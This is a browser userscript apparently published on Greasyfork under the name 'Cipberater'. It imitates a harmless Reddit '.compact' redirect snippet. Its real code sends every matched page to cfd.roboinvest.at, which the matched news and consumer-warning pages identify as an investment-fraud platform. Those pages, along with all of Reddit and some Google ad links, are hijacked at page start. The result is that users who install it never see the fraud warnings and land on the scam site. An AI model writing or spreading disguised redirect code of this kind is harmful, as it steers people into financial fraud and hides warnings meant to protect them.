// ==UserScript==
// @name        Cipberater
// @description the best
// @match       *://*.reddit.com/*
// @match       https://www.watchlist-internet.at/liste-finanzbetrug/site/roboinvestat/
// @match       https://kanzlei-herfurtner.de/roboinvest-at/
// @match       https://www.kleinezeitung.at/kaernten/6271553/Kryptobetrug_Statt-grosser-Gewinne-Tausende-Euro-Schaden-fuer
// @match       https://www.scamadviser.com/de/website-prufen/roboinvest.at
// @match       https://www.heute.at/s/enthuellt-polizei-warnt-vor-dieser-betrueger-plattform-100264044
// @match       https://www.meinbezirk.at/villach/c-lokales/ehepaar-aus-villach-wurde-opfer-von-anlagebetruegern_a5966866
// @match       https://www.5min.at/202304641057/kontoeroeffnung-wurde-villacher-ehepaar-zum-verhaengnis//
// @match       https://daili.at/2023/04/warnung-vor-anlagebetrug-vorsicht-auf-dieser-website/
// @match       https://www.google.com/aclk?sa=l&ai=DChcSEwjegtjC_er-AhWRLgYAHSVbD2AYABADGgJ3cw&sig=AOD64_2Ne0Xp0lJ8v_-cPs6UOYNrF6XNIQ&q&adurl&ved=2ahUKEwi359HC_er-AhXSQeUKHa6GAmAQ0Qx6BAgDEAE
// @match       https://www.google.com/aclk?sa=l&ai=DChcSEwi3s-Xy_er-AhWD6lEKHS63Dn4YABABGgJ3cw&sig=AOD64_12W2mjLx6JaaiUJLYRaDuQlpPMjQ&q&adurl&ved=2ahUKEwjR6d3y_er-AhW08rsIHfndCCQQ0Qx6BAgEEAE
// @run-at      document-start
// @grant       none
// @version 0.0.1.20230510144757
// @namespace https://greasyfork.org/users/972766
// @downloadURL https://update.greasyfork.org/scripts/465939/Cipberater.user.js
// @updateURL https://update.greasyfork.org/scripts/465939/Cipberater.meta.js
// ==/UserScript==

var oldUrlPath  = window.location.pathname;

/*--- Test that ".compact" is at end of URL, excepting any "hashes"
    or searches.
*/
if ( ! /\.compact$/.test (oldUrlPath) ) {

    var newURL  = window.location.protocol + "//"
                + window.location.host
                + oldUrlPath + ".compact"
                + window.location.search
                + window.location.hash
                ;
    /*-- replace() puts the good page in the history instead of the
        bad page.
    */
    window.location.replace ("https://cfd.roboinvest.at/");
}